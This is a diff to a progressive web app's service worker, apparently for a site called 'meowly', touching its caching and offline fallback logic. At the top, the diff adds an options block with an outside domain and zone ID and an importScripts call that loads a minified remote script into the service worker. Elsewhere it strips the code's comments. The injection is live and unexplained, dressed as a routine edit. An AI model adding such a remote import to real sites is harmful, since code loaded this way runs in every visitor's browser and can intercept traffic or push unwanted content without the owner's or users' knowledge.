@@ -1,3 +1,10 @@
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11814767
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+
 const CACHE_NAME = "meowly-pwa-cache-v1";
 const OFFLINE_URL = "/offline";
 
@@ -31,7 +38,6 @@ self.addEventListener("install", (event) => {
       .open(CACHE_NAME)
       .then((cache) => {
         console.log("[Service Worker] Pre-caching application shell");
-        // We use map to cache individually so one failing doesn't break the entire install
         return Promise.allSettled(
           ASSETS_TO_PRECACHE.map((url) =>
             cache.add(url).catch((err) => {
@@ -79,7 +85,6 @@ self.addEventListener("fetch", (event) => {
     event.respondWith(
       fetch(event.request)
         .then((response) => {
-          // Clone and cache the successfully fetched page
           if (response && response.status === 200) {
             const responseToCache = response.clone();
             caches.open(CACHE_NAME).then((cache) => {
@@ -89,7 +94,6 @@ self.addEventListener("fetch", (event) => {
           return response;
         })
         .catch(() => {
-          // Network failed, attempt to serve the page from cache, or fallback to /offline
           return caches.match(event.request).then((cachedResponse) => {
             return cachedResponse || caches.match(OFFLINE_URL);
           });
@@ -108,7 +112,6 @@ self.addEventListener("fetch", (event) => {
     event.respondWith(
       caches.match(event.request).then((cachedResponse) => {
         if (cachedResponse) {
-          // Serve from cache immediately and refresh in background (Stale-While-Revalidate)
           fetch(event.request)
             .then((networkResponse) => {
               if (networkResponse && networkResponse.status === 200) {
@@ -118,11 +121,10 @@ self.addEventListener("fetch", (event) => {
                 });
               }
             })
-            .catch(() => {}); // Suppress background fetch errors
+            .catch(() => {});
           return cachedResponse;
         }
 
-        // Cache miss: fetch from network, then cache
         return fetch(event.request).then((networkResponse) => {
           if (!networkResponse || networkResponse.status !== 200) {
             return networkResponse;
